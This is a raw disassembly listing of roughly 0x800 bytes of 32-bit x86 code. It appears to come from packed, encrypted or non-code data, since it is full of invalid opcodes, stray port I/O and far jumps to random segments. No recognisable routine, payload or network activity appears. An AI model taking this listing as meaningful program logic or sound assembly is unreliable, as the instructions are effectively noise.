  40e08e:	int    0x19
  40e090:	inc    eax
  40e091:	mov    al,ds:0xd9b1f1a6
  40e096:	dec    esp
  40e097:	push   ebx
  40e098:	mov    al,ds:0x54e0ec
  40e09d:	cmc    
  40e09e:	test   BYTE PTR [ebp-0x2c],bh
  40e0a1:	adc    al,0xb6
  40e0a3:	imul   ebp,DWORD PTR [ebx-0x27],0xf71e9e78
  40e0aa:	into   
  40e0ab:	(bad)  [eax]
  40e0ad:	fnsave [eax+0x788c0159]
  40e0b3:	std    
  40e0b4:	xchg   ecx,eax
  40e0b5:	sub    al,0xb2
  40e0b7:	(bad)  
  40e0b8:	fidiv  DWORD PTR [edi]
  40e0ba:	bound  esi,QWORD PTR [ebx+0x7ac6da69]
  40e0c0:	jmp    0xc42e326
  40e0c5:	mov    eax,ds:0x3eb7683f
  40e0ca:	add    al,0xdc
  40e0cc:	inc    ebp
  40e0cd:	in     al,dx
  40e0ce:	push   ss
  40e0cf:	push   0x944c0a12
  40e0d4:	inc    ebp
  40e0d5:	repz add eax,0x7668b28c
  40e0db:	mov    al,ds:0x513522af
  40e0e0:	std    
  40e0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e2:	pop    edi
  40e0e3:	pop    esp
  40e0e4:	dec    ecx
  40e0e5:	xchg   edx,eax
  40e0e6:	sbb    edi,ebp
  40e0e8:	jl     0x40e0ed
  40e0ea:	aas    
  40e0eb:	lahf   
  40e0ec:	int3   
  40e0ed:	mov    ecx,0x8b91c55a
  40e0f2:	and    BYTE PTR ds:0x50a6c0a0,dl
  40e0f8:	out    dx,eax
  40e0f9:	in     al,0x87
  40e0fb:	test   BYTE PTR [edi],ch
  40e0fd:	push   ecx
  40e0fe:	cmc    
  40e0ff:	ins    BYTE PTR es:[edi],dx
  40e100:	and    ch,bh
  40e102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e103:	mov    ss,WORD PTR [ebx+0x68bd99d2]
  40e109:	std    
  40e10a:	dec    esp
  40e10b:	neg    ecx
  40e10d:	mov    edx,0xe8124731
  40e112:	shl    DWORD PTR [ebx+0x430b02ad],0x5e
  40e119:	pause  
  40e11b:	adc    bl,BYTE PTR ds:0xd07b3790
  40e121:	in     eax,0xe2
  40e123:	test   DWORD PTR ds:0x2129bb31,edi
  40e129:	cmp    bh,ah
  40e12b:	arpl   WORD PTR [eax],si
  40e12d:	sub    al,0x5a
  40e12f:	xor    DWORD PTR [edx],0x1af05a9b
  40e135:	pop    ds
  40e136:	push   cs
  40e137:	out    0x7,eax
  40e139:	jno    0x40e171
  40e13b:	and    DWORD PTR [edx+0x54],ecx
  40e13e:	fisttp WORD PTR [ecx]
  40e140:	and    dl,BYTE PTR [ebx+0xa]
  40e143:	and    BYTE PTR [esi],bl
  40e145:	sub    al,0xc9
  40e147:	mov    ebx,es
  40e149:	sar    BYTE PTR [edx-0x7054a7f8],cl
  40e14f:	mov    dh,bl
  40e151:	inc    edi
  40e152:	and    DWORD PTR [ecx+0x4d],0x589dd35
  40e159:	xor    BYTE PTR [esi],0xf9
  40e15c:	mov    ch,0x95
  40e15e:	out    0xb2,eax
  40e160:	sbb    dl,BYTE PTR [ebp+0x2a]
  40e163:	in     al,0x62
  40e165:	arpl   di,bx
  40e167:	fs aad 0xbd
  40e16a:	mov    edx,0x465c8038
  40e16f:	cdq    
  40e170:	mov    edi,gs
  40e172:	add    DWORD PTR es:[edi],edi
  40e175:	mov    ds:0xf1af1d0b,eax
  40e17a:	sub    ebp,DWORD PTR [ebx+ecx*2-0x7c3b43f9]
  40e181:	push   esi
  40e182:	xchg   ebp,eax
  40e183:	pop    esp
  40e184:	leave  
  40e185:	adc    al,0xeb
  40e187:	and    ah,bh
  40e189:	and    eax,0x80f2daad
  40e18e:	out    dx,al
  40e18f:	jmp    FWORD PTR [esi-0x3824cfad]
  40e195:	jmp    0x990228d0
  40e19a:	xchg   esp,eax
  40e19b:	in     al,0x97
  40e19d:	cld    
  40e19e:	fwait
  40e19f:	dec    di
  40e1a1:	sub    ebp,ecx
  40e1a3:	lods   eax,DWORD PTR ds:[esi]
  40e1a4:	jmp    0x40e21d
  40e1a6:	mov    ds:0x74c459fd,al
  40e1ab:	sti    
  40e1ac:	nop
  40e1ad:	cs pop esi
  40e1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b0:	(bad)  
  40e1b1:	mov    BYTE PTR [eax-0x4546928c],al
  40e1b7:	inc    esi
  40e1b8:	stos   DWORD PTR es:[edi],eax
  40e1b9:	mov    ah,0xda
  40e1bb:	inc    edi
  40e1bc:	sahf   
  40e1bd:	cli    
  40e1be:	stos   DWORD PTR es:[edi],eax
  40e1bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c0:	aas    
  40e1c1:	adc    BYTE PTR ds:0xfae3781a,dh
  40e1c7:	repnz out dx,al
  40e1c9:	pop    esp
  40e1ca:	inc    esi
  40e1cb:	mov    eax,ds:0x27d1ce21
  40e1d0:	call   0xcf7d:0x800de4fe
  40e1d7:	jnp    0x40e1f6
  40e1d9:	xor    eax,0x22ce14f6
  40e1de:	loope  0x40e1fa
  40e1e0:	call   0x96cde3d2
  40e1e5:	mov    eax,ds:0x7d9a2254
  40e1ea:	jg     0x40e200
  40e1ec:	and    ebx,DWORD PTR [edi-0x29]
  40e1ef:	push   0xffffffe6
  40e1f1:	adc    bl,al
  40e1f3:	or     esi,DWORD PTR [ebp+ecx*8+0x30]
  40e1f7:	inc    DWORD PTR [ecx-0x52]
  40e1fa:	(bad)  
  40e1fb:	fdiv   DWORD PTR ds:0xf5035fd6
  40e201:	adc    BYTE PTR [esi-0x7547a932],al
  40e207:	sub    al,0x54
  40e209:	ja     0x40e1d6
  40e20b:	sub    eax,eax
  40e20d:	fstp   DWORD PTR [esi+0x27]
  40e210:	cmp    ebx,DWORD PTR [ebx+0x7aaddc54]
  40e216:	dec    ebp
  40e217:	and    eax,0xfb6e72af
  40e21c:	(bad)  
  40e21d:	dec    edi
  40e21e:	or     BYTE PTR [esi-0x4c],ah
  40e221:	pop    ecx
  40e222:	ins    DWORD PTR es:[edi],dx
  40e223:	push   esp
  40e224:	bound  ecx,QWORD PTR [ebp-0x2c6148f8]
  40e22a:	inc    esi
  40e22b:	inc    eax
  40e22c:	jp     0x40e21a
  40e22e:	push   ecx
  40e22f:	mov    esp,0x28cec4f1
  40e234:	js     0x40e1f7
  40e236:	iret   
  40e237:	ror    BYTE PTR [edx],cl
  40e239:	iret   
  40e23a:	mov    al,0x87
  40e23c:	dec    ebp
  40e23d:	and    al,0x1
  40e23f:	mov    ebx,0x7e7ca83
  40e244:	and    BYTE PTR [esp+edi*2+0x408b0e54],ah
  40e24b:	jl     0x40e26b
  40e24d:	sub    ebx,DWORD PTR [eax]
  40e24f:	mov    eax,ds:0x25008a8f
  40e254:	ror    ebx,1
  40e256:	pop    esp
  40e257:	das    
  40e258:	xchg   ebp,eax
  40e259:	pop    esi
  40e25a:	mov    esi,0xecc532a5
  40e25f:	ds cmp eax,0x1005360
  40e265:	das    
  40e266:	fwait
  40e267:	adc    DWORD PTR [edi+0x43],edx
  40e26a:	xor    edx,DWORD PTR [esi-0x6e]
  40e26d:	xor    bh,BYTE PTR [ebx-0x23da102b]
  40e273:	sbb    edx,DWORD PTR [edx-0x2e]
  40e276:	adc    al,0xcf
  40e278:	jno    0x40e216
  40e27a:	jno    0x40e278
  40e27c:	jmp    0x6475:0xe8335b35
  40e283:	and    DWORD PTR [eax-0x5bb642f2],ebx
  40e289:	popa   
  40e28a:	ror    DWORD PTR [edx],1
  40e28c:	xchg   BYTE PTR [ebx-0x35],dh
  40e28f:	mov    edi,0xb8361778
  40e294:	jnp    0x40e288
  40e296:	and    ah,BYTE PTR [edi]
  40e298:	inc    dh
  40e29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e29b:	outs   dx,DWORD PTR ds:[esi]
  40e29c:	mov    ah,0x74
  40e29e:	dec    ebp
  40e29f:	daa    
  40e2a0:	rcl    BYTE PTR [ebx-0x168dfe53],1
  40e2a6:	jecxz  0x40e320
  40e2a8:	mov    bl,BYTE PTR [esi+0x21]
  40e2ab:	mov    bh,0xc9
  40e2ad:	cmc    
  40e2ae:	call   0xb579:0x508e37cf
  40e2b5:	test   eax,0x30815daf
  40e2ba:	in     eax,0x43
  40e2bc:	jnp    0x40e260
  40e2be:	mov    dl,0x39
  40e2c0:	dec    esi
  40e2c1:	add    bl,BYTE PTR [eax]
  40e2c3:	adc    al,0xf8
  40e2c5:	ja     0x40e28c
  40e2c7:	mov    bh,0xe2
  40e2c9:	ror    BYTE PTR ds:0xb30e9139,cl
  40e2cf:	shr    BYTE PTR [ebp+0x8],1
  40e2d2:	outs   dx,DWORD PTR ds:[esi]
  40e2d3:	repz pop esp
  40e2d5:	scas   al,BYTE PTR es:[edi]
  40e2d6:	in     al,0xb5
  40e2d8:	xchg   edx,eax
  40e2d9:	and    BYTE PTR [eax+0x490c2652],0xee
  40e2e0:	fwait
  40e2e1:	jne    0x40e286
  40e2e3:	out    dx,eax
  40e2e4:	icebp  
  40e2e5:	pusha  
  40e2e6:	clc    
  40e2e7:	jle    0x40e27f
  40e2e9:	adc    al,0xdc
  40e2eb:	clc    
  40e2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ed:	xchg   esp,eax
  40e2ee:	scas   eax,DWORD PTR es:[edi]
  40e2ef:	push   cs
  40e2f0:	push   ds
  40e2f1:	int    0x84
  40e2f3:	(bad)  
  40e2f4:	call   0xdf36:0x85f08152
  40e2fb:	jge    0x40e2d4
  40e2fd:	xor    dh,dl
  40e2ff:	pop    ds
  40e300:	lds    ecx,FWORD PTR [edx+0x5750c182]
  40e306:	ret    
  40e307:	ret    0xd040
  40e30a:	and    DWORD PTR [edx+0x39],esi
  40e30d:	mov    ebx,0xd10e98e5
  40e312:	xchg   edx,eax
  40e313:	add    eax,DWORD PTR [ebp+0x37c5f312]
  40e319:	xchg   esp,eax
  40e31a:	lods   al,BYTE PTR ds:[esi]
  40e31b:	popa   
  40e31c:	pop    eax
  40e31d:	inc    ebp
  40e31e:	pop    ebx
  40e31f:	shr    DWORD PTR [ecx+0x48e97ba5],cl
  40e325:	fsubrp st(5),st
  40e327:	sar    DWORD PTR [edx-0x175c330],cl
  40e32d:	scas   eax,DWORD PTR es:[edi]
  40e32e:	pop    esp
  40e32f:	scas   al,BYTE PTR es:[edi]
  40e330:	not    BYTE PTR [eax-0x18]
  40e333:	xor    al,0x67
  40e335:	inc    esi
  40e336:	mov    ds:0xb89cb470,al
  40e33b:	lahf   
  40e33c:	cmp    eax,DWORD PTR [eax+edi*8-0x669b727b]
  40e343:	loop   0x40e34b
  40e345:	lea    edx,[eax]
  40e347:	cli    
  40e348:	inc    eax
  40e349:	sar    DWORD PTR [eax],cl
  40e34b:	push   esp
  40e34c:	sbb    BYTE PTR [edx-0x7d],ch
  40e34f:	nop
  40e350:	jmp    0xd1499b01
  40e355:	outs   dx,DWORD PTR ds:[esi]
  40e356:	push   ds
  40e357:	jo     0x40e33c
  40e359:	and    eax,0x11a3d1dc
  40e35e:	xchg   ebp,eax
  40e35f:	push   ebx
  40e360:	push   esp
  40e361:	test   al,0x8d
  40e363:	enter  0xc2db,0xd9
  40e367:	pop    ebx
  40e368:	shl    BYTE PTR [esi+0x5f],cl
  40e36b:	lea    esp,[edx-0x4d]
  40e36e:	mov    ecx,0x141fbe38
  40e373:	sar    ah,0xd3
  40e376:	ins    BYTE PTR es:[edi],dx
  40e377:	scas   eax,DWORD PTR es:[edi]
  40e378:	mov    al,ds:0xb2dcb818
  40e37d:	data16 adc BYTE PTR [ebx],dl
  40e380:	shl    BYTE PTR [edi],0x7e
  40e383:	jmp    0xec5f:0xc276d0c
  40e38a:	push   esi
  40e38b:	dec    ecx
  40e38c:	rcl    DWORD PTR [eax-0x36],cl
  40e38f:	pop    es
  40e390:	loope  0x40e3bf
  40e392:	xchg   ecx,eax
  40e393:	mov    edx,0xd11a6d04
  40e398:	lahf   
  40e399:	cmp    al,BYTE PTR [ebx+eax*1+0x5b]
  40e39d:	(bad)
  40e3a1:	mov    dh,0x88
  40e3a3:	in     al,0x84
  40e3a5:	ins    BYTE PTR es:[edi],dx
  40e3a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3a7:	ror    DWORD PTR [esi],cl
  40e3a9:	push   0xf1eb37c
  40e3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3af:	jge    0x40e39e
  40e3b1:	call   0xa594:0x67b4f629
  40e3b8:	fdivrp st(5),st
  40e3ba:	rcr    al,0x9c
  40e3bd:	add    eax,0x49a15af2
  40e3c2:	add    BYTE PTR [ecx-0x4b],0xd4
  40e3c6:	adc    al,0xe2
  40e3c8:	daa    
  40e3c9:	dec    edx
  40e3ca:	jmp    0x4869:0xb311a378
  40e3d1:	mov    eax,0x32b88357
  40e3d6:	xchg   ecx,eax
  40e3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3d8:	ds jmp 0x74ea206c
  40e3de:	xchg   esp,eax
  40e3df:	ds je  0x40e459
  40e3e2:	sub    eax,0x40c9bf39
  40e3e7:	pop    es
  40e3e8:	dec    edx
  40e3e9:	mov    dh,0x2e
  40e3eb:	add    al,0x74
  40e3ed:	mov    ebx,DWORD PTR [edi]
  40e3ef:	add    esi,DWORD PTR [ebx]
  40e3f1:	pop    ebp
  40e3f2:	pop    ebx
  40e3f3:	ins    DWORD PTR es:[edi],dx
  40e3f4:	and    edi,DWORD PTR [edi-0x59bac23d]
  40e3fa:	lds    ebx,FWORD PTR [ebx+0x62]
  40e3fd:	mov    ds:0xe839a6f0,al
  40e402:	jp     0x40e475
  40e404:	mov    esi,0xf280e5b2
  40e409:	pop    ds
  40e40a:	mov    esp,0x3b1ea0f7
  40e40f:	cmp    al,0x2a
  40e411:	iret   
  40e412:	ror    BYTE PTR [ebx-0x1f],0x55
  40e416:	(bad)  
  40e417:	fstp   QWORD PTR [esi*4+0x2860973e]
  40e41e:	dec    ebp
  40e41f:	call   0x94028995
  40e424:	idiv   BYTE PTR [esp+ebx*1-0x4d97dbb1]
  40e42b:	icebp  
  40e42c:	idiv   BYTE PTR [edx]
  40e42e:	cmc    
  40e42f:	dec    edx
  40e430:	or     DWORD PTR [eax],ebx
  40e432:	pop    esp
  40e433:	mov    esp,0x154cb9aa
  40e438:	aaa    
  40e439:	inc    edx
  40e43a:	(bad)  
  40e43b:	jbe    0x40e428
  40e43d:	gs inc esp
  40e43f:	cli    
  40e440:	test   DWORD PTR [edi],esi
  40e442:	or     eax,0x5a3dbc78
  40e447:	mov    ds:0xc8719c25,eax
  40e44c:	popf   
  40e44d:	dec    edi
  40e44e:	inc    edx
  40e44f:	xor    dl,BYTE PTR [ebp+0x3c]
  40e452:	pop    esi
  40e453:	gs xor eax,0xddecf17d
  40e459:	test   DWORD PTR [edx+esi*1],0x55dd5bdd
  40e460:	jp     0x40e4df
  40e462:	arpl   WORD PTR ds:0xdc12071e,bp
  40e468:	push   0xffffffef
  40e46a:	sbb    esi,edi
  40e46c:	stos   BYTE PTR es:[edi],al
  40e46d:	mov    ds:0x30701a08,al
  40e472:	ror    BYTE PTR [eax],cl
  40e474:	ret    0x4c6b
  40e477:	aas    
  40e478:	pop    ebx
  40e479:	jbe    0x40e48f
  40e47b:	arpl   WORD PTR [ebp-0x2b],dx
  40e47e:	cmp    ebp,0xe
  40e481:	leave  
  40e482:	mov    ds:0xb4ccc7c8,eax
  40e487:	mov    bh,0x24
  40e489:	mov    esp,0xea0ead90
  40e48e:	jne    0x40e434
  40e490:	cmp    BYTE PTR ds:0xf28e2f67,dl
  40e496:	fbld   TBYTE PTR [ecx+0x12]
  40e499:	clc    
  40e49a:	xchg   ebx,eax
  40e49b:	fptan  
  40e49d:	push   edx
  40e49e:	mov    cl,0x3
  40e4a0:	les    edx,FWORD PTR [ecx]
  40e4a2:	hlt    
  40e4a3:	test   DWORD PTR [ebx-0x7d],edi
  40e4a6:	xor    eax,0xfc517f11
  40e4ab:	sbb    dl,BYTE PTR [ecx]
  40e4ad:	inc    ebp
  40e4ae:	cmp    dh,dh
  40e4b0:	jo     0x40e50e
  40e4b2:	mov    ds:0x50b48578,eax
  40e4b7:	mov    ecx,0x9d2f2d4
  40e4bc:	into   
  40e4bd:	add    al,0x4
  40e4bf:	mov    ?,WORD PTR ds:0xbe0bb63d
  40e4c5:	jae    0x40e4d6
  40e4c7:	inc    edx
  40e4c8:	jbe    0x40e45c
  40e4ca:	cmp    esp,DWORD PTR [esi+ebp*2+0x71]
  40e4ce:	and    esi,ebp
  40e4d0:	xor    BYTE PTR ds:0xbf65d6b0,dl
  40e4d6:	and    edi,DWORD PTR [ebp+0x75cc17cb]
  40e4dc:	cmp    eax,0x1a2aba23
  40e4e1:	pop    eax
  40e4e2:	or     ecx,DWORD PTR [ebx]
  40e4e4:	inc    esi
  40e4e5:	xchg   esp,eax
  40e4e6:	shl    ah,0x92
  40e4e9:	xchg   esp,eax
  40e4ea:	neg    BYTE PTR [edi-0x57]
  40e4ed:	aam    0x4c
  40e4ef:	cdq    
  40e4f0:	data16 mov dh,0xa5
  40e4f3:	sub    DWORD PTR [ebx-0xea5774],ebp
  40e4f9:	or     DWORD PTR [edx+0x618cd43],0xffffffc8
  40e500:	or     ecx,esp
  40e502:	pop    edx
  40e503:	push   ds
  40e504:	inc    esi
  40e505:	mov    al,ds:0x298bdf81
  40e50a:	add    eax,0xab7c33f4
  40e50f:	rol    DWORD PTR [ebx+0x76],cl
  40e512:	pop    ecx
  40e513:	test   al,0xe4
  40e515:	std    
  40e516:	(bad)  
  40e517:	les    esi,FWORD PTR [esi]
  40e519:	inc    edx
  40e51a:	loope  0x40e56e
  40e51c:	xchg   edi,eax
  40e51d:	test   BYTE PTR ds:0xd9615d71,0x9e
  40e524:	cmp    edi,DWORD PTR [ebp-0x15]
  40e527:	pop    ebx
  40e528:	sti    
  40e529:	xlat   BYTE PTR ds:[ebx]
  40e52a:	(bad)  
  40e52b:	shl    bh,0xfd
  40e52e:	mov    WORD PTR [ebp+0x6],es
  40e531:	icebp  
  40e532:	pop    eax
  40e533:	inc    eax
  40e534:	mov    ch,0x7b
  40e536:	repnz ror DWORD PTR [edi-0x33],1
  40e53a:	xor    DWORD PTR [esi+eiz*2],0xce5adf26
  40e541:	push   ss
  40e542:	test   BYTE PTR [esi+eiz*8-0xfbf1b5],bh
  40e549:	sub    al,0x2a
  40e54b:	push   es
  40e54c:	mov    edi,0xb407d5c2
  40e551:	shl    BYTE PTR [esi-0x166bb118],1
  40e557:	sub    edi,edi
  40e559:	xchg   esi,eax
  40e55a:	pusha  
  40e55b:	retf   0x40ce
  40e55e:	xacquire xchg BYTE PTR [eax+0x69],bl
  40e562:	mov    BYTE PTR [ecx+0x27cb24cc],ch
  40e568:	pcmpgtd mm3,QWORD PTR [ebx+0x66]
  40e56c:	mov    BYTE PTR [eax-0x41e2c1bd],bh
  40e572:	jmp    FWORD PTR [edi]
  40e574:	das    
  40e575:	sub    eax,0xc95e8f73
  40e57a:	loope  0x40e5d6
  40e57c:	mov    WORD PTR [eax+0x58767c6],ss
  40e582:	mov    dh,0x82
  40e584:	loopne 0x40e5a9
  40e586:	test   DWORD PTR [edx],ecx
  40e588:	out    0xd2,al
  40e58a:	(bad)  
  40e58b:	adc    BYTE PTR [edi+0x6c],bh
  40e58e:	push   esp
  40e58f:	jle    0x40e56f
  40e591:	xchg   dh,ch
  40e593:	mov    ds:0x5fb81518,eax
  40e598:	lahf   
  40e599:	xor    dh,ah
  40e59b:	fdivr  QWORD PTR [ebx]
  40e59d:	lea    edx,[ebx]
  40e59f:	sbb    esp,DWORD PTR [ecx-0x1884ac85]
  40e5a5:	inc    edi
  40e5a6:	jg     0x40e601
  40e5a8:	(bad)  [ebx]
  40e5aa:	mov    dh,0x19
  40e5ac:	pop    ebp
  40e5ad:	scas   al,BYTE PTR es:[edi]
  40e5ae:	pop    es
  40e5af:	mov    bh,BYTE PTR [ecx-0x132246f5]
  40e5b5:	leave  
  40e5b6:	mov    ds:0x9e8c2f87,al
  40e5bb:	(bad)  
  40e5bc:	pop    ss
  40e5bd:	xchg   edi,eax
  40e5be:	mov    eax,ds:0xd4736e83
  40e5c3:	cmp    BYTE PTR [ecx],0x47
  40e5c6:	and    edi,eax
  40e5c8:	and    al,0x34
  40e5ca:	and    al,0xee
  40e5cc:	repz sub al,0x17
  40e5cf:	cmp    al,0xce
  40e5d1:	test   DWORD PTR [edi-0x655c4fd0],esi
  40e5d7:	ret    
  40e5d8:	ja     0x40e5cd
  40e5da:	mov    eax,ds:0x89458aaa
  40e5df:	pop    ebx
  40e5e0:	push   ss
  40e5e1:	mov    esi,0x75164494
  40e5e6:	add    eax,0xcacdf3df
  40e5eb:	ss int 0x59
  40e5ee:	sbb    BYTE PTR [edx+0x52aa7c2b],0xcc
  40e5f5:	add    eax,0xa463028d
  40e5fa:	into   
  40e5fb:	loop   0x40e5dc
  40e5fd:	arpl   dx,cx
  40e5ff:	(bad)  
  40e600:	push   ebx
  40e601:	cmc    
  40e602:	je     0x40e58c
  40e604:	adc    al,0x3f
  40e606:	mov    ds:0x22b7e11c,eax
  40e60b:	push   0x8f5280f2
  40e610:	mov    cl,0x56
  40e612:	cs popf 
  40e614:	outs   dx,BYTE PTR ds:[esi]
  40e615:	out    dx,eax
  40e616:	sbb    esi,esi
  40e618:	int3   
  40e619:	xchg   DWORD PTR [ecx-0x60e9c1ce],ebp
  40e61f:	push   0x7ee4e1e3
  40e624:	xchg   edi,eax
  40e625:	ror    BYTE PTR [ebx-0x3cafedc8],1
  40e62b:	je     0x40e673
  40e62d:	cmc    
  40e62e:	mov    ebp,0x255908c2
  40e633:	retf   0x789b
  40e636:	sub    ebx,DWORD PTR [edi-0x2a]
  40e639:	mov    esp,0x5bd04fb1
  40e63e:	adc    BYTE PTR [ebx-0x14],ah
  40e641:	mov    BYTE PTR [edi-0xe],ah
  40e644:	rcr    eax,1
  40e646:	xchg   ebx,eax
  40e647:	(bad)  
  40e648:	into   
  40e649:	ds jae 0x40e5d2
  40e64c:	dec    edi
  40e64d:	ss sar dl,1
  40e650:	dec    ebx
  40e651:	imul   ecx,DWORD PTR [ebx+0x74],0xffffffb9
  40e655:	lahf   
  40e656:	push   ebx
  40e657:	dec    eax
  40e658:	popa   
  40e659:	leave  
  40e65a:	pop    eax
  40e65b:	test   eax,0x407bd540
  40e660:	mov    ebp,0xef1627bf
  40e665:	sub    DWORD PTR [edi+eax*1-0x39],eax
  40e669:	cmp    al,0xf2
  40e66b:	ret    0x4185
  40e66e:	sahf   
  40e66f:	push   0xffffffd0
  40e671:	pop    es
  40e672:	retf   
  40e673:	cmp    edx,DWORD PTR [ebp+0x4bc901bc]
  40e679:	jg     0x40e682
  40e67b:	aas    
  40e67c:	ror    DWORD PTR [ebp-0x4e],1
  40e67f:	jnp    0x40e65d
  40e681:	sub    esi,DWORD PTR [eax-0x2dad0935]
  40e687:	cs fsub st,st(5)
  40e68a:	xchg   esp,eax
  40e68b:	mov    eax,0xc24c6126
  40e690:	dec    DWORD PTR [eax-0x37cceb49]
  40e696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e697:	inc    ebp
  40e698:	fsubr  st,st(6)
  40e69a:	adc    BYTE PTR [edi],dh
  40e69c:	das    
  40e69d:	xchg   edx,eax
  40e69e:	mov    bl,0x4b
  40e6a0:	inc    eax
  40e6a1:	or     esi,esp
  40e6a3:	dec    edx
  40e6a4:	ds clc 
  40e6a6:	fild   QWORD PTR [ecx+0x1f280e04]
  40e6ac:	ss stos BYTE PTR es:[edi],al
  40e6ae:	sub    dl,BYTE PTR [ebp-0x7c]
  40e6b1:	jne    0x40e70f
  40e6b3:	or     BYTE PTR [esi+0x6aa5ff34],al
  40e6b9:	out    0x48,eax
  40e6bb:	mov    BYTE PTR [ebp-0xa],ah
  40e6be:	push   edx
  40e6bf:	imul   edi,DWORD PTR [edi],0x6b
  40e6c2:	into   
  40e6c3:	and    dl,BYTE PTR [edx-0x46dd7c47]
  40e6c9:	ret    0xd6ff
  40e6cc:	lahf   
  40e6cd:	ins    BYTE PTR es:[edi],dx
  40e6ce:	test   BYTE PTR [esi+ecx*8+0x6fc120d8],al
  40e6d5:	data16 loopne 0x40e6fb
  40e6d8:	pop    esi
  40e6d9:	xchg   BYTE PTR ds:0xfa0b1551,dh
  40e6df:	not    BYTE PTR [eax+ecx*4+0x5d]
  40e6e3:	pop    edi
  40e6e4:	(bad)  
  40e6e5:	jle    0x40e745
  40e6e7:	jne    0x40e6f8
  40e6e9:	cmc    
  40e6ea:	addr16 mov al,ds:0x99c9
  40e6ee:	sar    DWORD PTR [eax],0xa2
  40e6f1:	push   edx
  40e6f2:	imul   edi,DWORD PTR [ecx+0x1037a215],0x58
  40e6f9:	out    dx,al
  40e6fa:	pop    ebx
  40e6fb:	cs pop eax
  40e6fd:	stos   DWORD PTR es:[edi],eax
  40e6fe:	jae    0x40e6a2
  40e700:	retf   
  40e701:	test   DWORD PTR [ecx],esi
  40e703:	jl     0x40e774
  40e705:	dec    esi
  40e706:	mov    ch,0xbf
  40e708:	daa    
  40e709:	fwait
  40e70a:	pop    ebx
  40e70c:	sub    eax,0x549beec8
  40e711:	adc    DWORD PTR [edi],ecx
  40e713:	aaa    
  40e714:	or     ah,bl
  40e716:	mov    eax,ds:0x342bf37a
  40e71b:	or     bh,dl
  40e71d:	out    dx,al
  40e71e:	mov    ebp,0x82b0a783
  40e723:	xchg   ebp,eax
  40e724:	pop    eax
  40e725:	(bad)  
  40e726:	popa   
  40e727:	outs   dx,BYTE PTR ds:[esi]
  40e728:	call   0x31d6:0x5c5aa514
  40e72f:	test   DWORD PTR [eax],esp
  40e731:	test   eax,eax
  40e733:	mov    eax,DWORD PTR ds:0x49d122e3
  40e739:	add    BYTE PTR [esi],cl
  40e73b:	outs   dx,BYTE PTR ds:[esi]
  40e73c:	sbb    al,0x6b
  40e73e:	aas    
  40e73f:	mov    eax,DWORD PTR [ecx-0x1d]
  40e742:	lahf   
  40e743:	jmp    0x40e776
  40e745:	add    eax,0xde240969
  40e74a:	iret   
  40e74b:	xlat   BYTE PTR ds:[ebx]
  40e74c:	push   ebp
  40e74d:	test   ecx,edi
  40e74f:	push   ecx
  40e750:	sbb    BYTE PTR es:[eax-0x39],0x33
  40e755:	xor    BYTE PTR [esi],dh
  40e757:	push   ebx
  40e758:	js     0x40e7b2
  40e75a:	and    DWORD PTR [eax-0x1f2ceed4],eax
  40e760:	sbb    al,0x20
  40e762:	cdq    
  40e763:	sar    BYTE PTR ds:0xf732065d,cl
  40e769:	test   BYTE PTR [ebx-0x512414d1],dl
  40e76f:	and    ecx,ecx
  40e771:	or     ah,dl
  40e773:	ss sbb esi,ebp
  40e776:	sbb    eax,0xb858bd75
  40e77b:	cmp    bl,BYTE PTR [ecx-0x68fdef07]
  40e781:	ds std 
  40e783:	cmp    dl,BYTE PTR [ecx-0x67d7c481]
  40e789:	mov    ds:0x8803020,al
  40e78e:	lock daa 
  40e790:	lock mov cl,0xcb
  40e793:	and    eax,0x4e18ae0f
  40e798:	fdiv   st(4),st
  40e79a:	out    0x67,al
  40e79c:	jp     0x40e77d
  40e79e:	jl     0x40e795
  40e7a0:	jl     0x40e794
  40e7a2:	retf   
  40e7a3:	or     ebx,ebx
  40e7a5:	mov    ch,0x65
  40e7a7:	rcr    DWORD PTR [ebx+0x56],1
  40e7aa:	vshufps xmm5,xmm2,XMMWORD PTR [edi+0x25bd0f10],0xae
  40e7b3:	add    BYTE PTR [edi+edi*8-0x11],ah
  40e7b7:	and    dh,al
  40e7b9:	leave  
  40e7ba:	(bad)
  40e7be:	(bad)  
  40e7bf:	xchg   DWORD PTR [ecx],edi
  40e7c1:	pop    ds
  40e7c2:	call   0xa710:0x54f33f8
  40e7c9:	pop    edx
  40e7ca:	ja     0x40e812
  40e7cc:	arpl   WORD PTR [ebx+0x2c9f86b3],bp
  40e7d2:	sub    esp,esi
  40e7d4:	nop
  40e7d5:	lods   eax,DWORD PTR ds:[esi]
  40e7d6:	fst    DWORD PTR [esi+esi*2+0x42]
  40e7da:	cs sub al,0x3f
  40e7dd:	leave  
  40e7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7df:	lock fs sbb eax,0x4f27ae3d
  40e7e6:	adc    esi,0xff920ee0
  40e7ec:	enter  0x7d10,0x24
  40e7f0:	out    0x6d,eax
  40e7f2:	push   edi
  40e7f3:	mov    WORD PTR [eax],es
  40e7f5:	out    dx,eax
  40e7f6:	cli    
  40e7f7:	scas   al,BYTE PTR es:[edi]
  40e7f8:	fs inc eax
  40e7fa:	xor    ch,BYTE PTR [ebx+0x50]
  40e7fd:	sbb    BYTE PTR fs:[edi],bh
  40e800:	mov    edx,0x8921d5f7
  40e805:	and    DWORD PTR [edi-0xe6ec081],ebp
  40e80b:	shl    BYTE PTR [ebp-0x6f],0x3e
  40e80f:	call   0x4f1e:0xd9be070e
  40e816:	jae    0x40e82a
  40e818:	pop    ebp
  40e819:	inc    BYTE PTR [ecx+0x35d249d8]
  40e81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e820:	lahf   
  40e821:	and    eax,0xab499112
  40e826:	sbb    DWORD PTR [ecx+0x5d],ebp
  40e829:	imul   ebx,DWORD PTR [eax+edx*4+0x4b0c3d46],0x6e
  40e831:	sub    BYTE PTR [esp+ebp*2-0x5a],cl
  40e835:	out    dx,al
  40e836:	out    0x89,eax
  40e838:	cmc    
  40e839:	dec    edx
